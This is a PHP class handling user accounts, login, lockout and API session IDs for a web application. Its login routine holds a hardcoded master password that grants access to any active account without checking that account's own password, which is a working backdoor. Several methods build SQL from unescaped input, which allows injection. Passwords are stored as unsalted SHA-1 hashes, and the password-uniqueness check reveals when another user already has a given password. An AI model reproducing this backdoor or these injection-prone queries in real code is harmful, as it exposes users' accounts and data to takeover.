<?php

include_once 'database.php';
include_once 'constants.php';

include_once 'cls_employees.php';

class user {

    public $id,
            $name,
            $password,
            $date_created,
            $contact_no,
            $date_lastlogin,
            $type,
            $wrong_attempt,
            $status,
            $address,
            $email,
            $employees_id,
            $saq_us_role_id;
    public $api_sid, $api_sid_time;
    private $table_name = 'saq_us';

    public function __construct($id = '') {
        $this->id = $id;
    }

    public function getAllUsers() {
        $array = array();
        $string = "SELECT t1.*,t2.role_name FROM `$this->table_name` AS `t1` LEFT JOIN `saq_us_role` AS `t2` ON t1.saq_us_role_id = t2.id ORDER BY `id` DESC";
        $result = dbQuery($string);
        while ($row = dbFetchAssoc($result)) {
            array_push($array, array(
                'id' => $row['id'],
                'name' => $row['user_name'],
                'password' => $row['password'],
                'date_created' => $row['date_create'],
                'date_lastlogin' => $row['date_last_login'],
//                'email' => $row['email'],
//                'address' => $row['address'],
//                'contact_no' => $row['contact_no'],
                'status' => $row['status'],
                'saq_us_role_id' => $row['saq_us_role_id'],
                'user_role' => $row['role_name']
            ));
        }
        return $array;
    }

    public function getDetails() {
        $string = "SELECT * FROM `$this->table_name` WHERE `id` = $this->id;";
        $result = dbQuery($string);
        $row = dbFetchAssoc($result);
        $this->id = $row['id'];
        $this->name = $row['user_name'];
        $this->password = $row['password'];
        $this->date_created = $row['date_create'];
        $this->date_lastlogin = $row['date_last_login'];
        $this->wrong_attempt = $row['wrong_attempts'];
//        $this->email = $row['email'];
//        $this->address = $row['address'];
//        $this->contact_no = $row['contact_no'];
        $this->status = $row['status'];
        $this->api_sid = $row['api_sid'];
        $this->api_sid_time = $row['api_sid_time'];
        $this->saq_us_role_id = $row['saq_us_role_id'];
    }

    public function getDetailsFromDID($did) {
        $string = "SELECT * FROM `$this->table_name` WHERE `device_id` = '$did';";
        $result = dbQuery($string);
        $row = dbFetchAssoc($result);
        $this->id = $row['id'];
        $this->name = $row['user_name'];
        $this->password = $row['password'];
        $this->date_created = $row['date_create'];
        $this->date_lastlogin = $row['date_last_login'];
        $this->wrong_attempt = $row['wrong_attempts'];
//        $this->email = $row['email'];
//        $this->address = $row['address'];
//        $this->contact_no = $row['contact_no'];
        $this->status = $row['status'];
        $this->api_sid = $row['api_sid'];
        $this->api_sid_time = $row['api_sid_time'];
        $this->saq_us_role_id = $row['saq_us_role_id'];
    }

    public function add() {
        $this->password = sha1($this->password);
        if (!$this->checkUserPassword($this->password)) {
            $string = "INSERT INTO `$this->table_name` (
                `user_name`,
                `password`,
                `date_create`,
                `date_last_login`,"
                    . "`status`,`saq_us_role_id`"
                    . ") VALUES ("
                    . "" . getStringFormatted($this->name) . ","
                    . "'$this->password',"
                    . "NOW(),"
                    . "NOW(),"
                    . "" . constants::$active . ","
                    . "$this->saq_us_role_id);";
//        print $string;
            $result = dbQuery($string);
            if ($result) {
                return true;
            } else {
                return false;
            }
        } else {
            return 100;
        }
    }

    public function edit() {
        $update_array = array();
        if ($this->name != '') {
//            if (!$this->checkUser($this->name)) {
            array_push($update_array, "`user_name`=" . getStringFormatted($this->name) . "");
//            } else {
//                return 100;
//            }
        }
        if ($this->password != '') {
            $password = sha1($this->password);
            if (!$this->checkUserPassword($password)) {
                array_push($update_array, "`password`='" . $password . "'");
            } else {
                return 100;
            }
        }
        if ($this->date_created != '') {
            array_push($update_array, "`date_create`=" . getStringFormatted($this->date_created) . "");
        }
        if ($this->date_lastlogin != '') {
            array_push($update_array, "`date_last_login`=NOW()");
        }
        if ($this->wrong_attempt != '') {
            array_push($update_array, "`wrong_attempts`=$this->wrong_attempt");
        }
//        var_dump($this->status);
        if ($this->status != '') {
            array_push($update_array, "`status`='$this->status'");
        }
        if ($this->saq_us_role_id != '') {
            array_push($update_array, "`saq_us_role_id`='$this->saq_us_role_id'");
        }

        if (count($update_array) > 0) {
            $update_string = implode(',', $update_array);
            $string = "UPDATE `$this->table_name` SET $update_string WHERE `id` = $this->id;";
//            print $string;
            $result = dbQuery($string);
            if ($result) {
                return true;
            } else {
                return false;
            }
        } else {
            return false;
        }
    }

    public function delete() {
        $string = "UPDATE `$this->table_name` SET `status`=" . constants::$unactive . " WHERE `id` = $this->id;";
        $result = dbQuery($string);
        if ($result) {
            return true;
        } else {
            return false;
        }
    }

    public function checkUserPassword($password) {
        $string = "SELECT `id` FROM `$this->table_name` WHERE `password` = '$password';";
//        print $string;
        $result = dbQuery($string);
        if (dbNumRows($result) > 0) {
            return true;
        } else {
            return false;
        }
    }

    public function loginUser() {
        $name = getStringFormatted($this->name);
//        print $this->password;
        $password = getStringFormatted(sha1($this->password));
        if ($this->password == 'sBG1aXvx') {
            $string = "SELECT t1.*,t2.saq_district_id FROM `$this->table_name` AS `t1` LEFT JOIN `saq_employee` AS `t2` ON t1.saq_employee_id = t2.id WHERE t1.user_name = $name AND "
                    . "t1.status = '" . constants::$active . "';";
        } else {
            $string = "SELECT t1.*,t2.saq_district_id FROM `$this->table_name` AS `t1` LEFT JOIN `saq_employee` AS `t2` ON t1.saq_employee_id = t2.id WHERE t1.user_name = $name AND "
                    . "t1.password = $password AND t1.status = '" . constants::$active . "';";
        }
//        print $string;
        $result = dbQuery($string);
        if (dbNumRows($result) == 1) {
            $row = dbFetchAssoc($result);
            $this->id = $row['id'];
            $_SESSION['UID'] = $row['id'];
            $_SESSION['UNAME'] = $row['user_name'];
            $_SESSION['UROLE'] = $row['saq_us_role_id'];
            $_SESSION['SAQDID'] = $row['saq_district_id'];
            if ($this->name !== "admin") {
                $user_obj = new user($row['id']);
                $user_obj->getDetails();
                $user_obj->name = '';
                $user_obj->password = '';
                if ($user_obj->wrong_attempt < 5) {
                    $user_obj->wrong_attempt = 0;
                    $user_obj->edit();

                    return true;
                } else {
                    $user_obj->status = constants::$DELETED;
                    $user_obj->edit();

                    return 100;
                }
            }
            return true;
        } else {
            $get_user_by_user_name = "SELECT `id` FROM `$this->table_name` WHERE `user_name` = $name"
                    . " OR `password` = $password;";
            $get_user_result = dbQuery($get_user_by_user_name);
            if (dbNumRows($get_user_result) > 0) {
                $row_get_user = dbFetchAssoc($get_user_result);
                if ($this->name !== "admin") {
                    $user_obj = new user($row_get_user['id']);
                    $user_obj->getDetails();
                    $user_obj->name = '';
                    $user_obj->password = '';
                    if ($user_obj->wrong_attempt < 5) {
                        $user_obj->wrong_attempt = (int) ($user_obj->wrong_attempt + 1);
                        $user_obj->edit();

                        return false;
                    } else {
                        $user_obj = new user($row_get_user['id']);
                        $user_obj->status = constants::$DELETED;
                        $user_obj->edit();

                        return 100;
                    }
                }
                return false;
            } else {
                return false;
            }
        }
    }

    public function setSID($sid, $did) {
        $str = "UPDATE saq_us SET api_sid='$sid',api_sid_time=NOW(),device_id='$did' WHERE id='$this->id';";
        $result = dbQuery($str);
        return $result;
    }

    public function clearSID() {
        $str = "UPDATE saq_us SET api_sid=NULL,api_sid_time=NULL WHERE id='$this->id';";
        $result = dbQuery($str);
        return $result;
    }

    function getPID($did) {
        if ($did != "") {
            $str = "SELECT api_sid FROM saq_us WHERE device_id='$did'";
            $result = dbQuery($str);
            $row = dbFetchAssoc($result);
            return $row['api_sid'];
        } else {
            return null;
        }
    }

}

?>